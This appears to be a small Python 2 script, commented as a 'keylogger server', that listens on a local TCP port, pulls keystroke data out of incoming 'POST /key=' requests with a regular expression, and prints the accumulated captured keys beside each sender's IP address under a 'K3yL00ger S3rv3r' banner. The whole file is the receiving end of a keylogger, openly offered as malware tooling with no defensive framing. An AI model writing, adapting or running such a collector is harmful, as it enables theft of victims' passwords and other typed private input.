import socket,re,colorama
from colorama import Fore

colorama.init()
#keylogger server
host = '127.0.0.1'
port = 8080
size = 1024 
key = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(2)
print Fore.GREEN+"[+] -St4r7 K3yL00ger S3rv3r-"
while 1:
	client, address = s.accept()	
	data = client.recv(size)
	if data:
		data = data
		d = re.findall(r"POST /key=(.*?) " , data)
		q = key.append(d[0])	
		ky = ''.join(key)
		print Fore.RED+'[+] '+Fore.CYAN+address[0]+': '+Fore.GREEN+ky
		
